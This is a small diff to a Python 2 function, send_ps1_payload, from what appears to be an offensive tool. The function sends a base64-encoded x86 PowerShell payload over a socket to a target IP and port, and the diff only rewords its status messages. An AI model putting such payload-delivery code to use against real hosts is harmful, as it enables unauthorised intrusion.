@@ -228,6 +228,7 @@ def send_ps1_payload(conf, bind_port, target_ip, nothidden=False):
     else:
         print colorize("[+] ","green")+"Target architecture: x86"
         ps1_encoded = main_ps1_template.format(b64encode(ps1_x86))
+    print colorize("[+] ","green")+"Sending ps1 payload to {0}:{1}".format(target_ip, bind_port)
     s.sendall(ps1_encoded)
     s.close()
-    print colorize("[+] ","green")+"ps1 payload send to target {0}:{1}".format(target_ip, bind_port)
+    print colorize("[+] ","green")+"ps1 payload sent to target {0}:{1}".format(target_ip, bind_port)
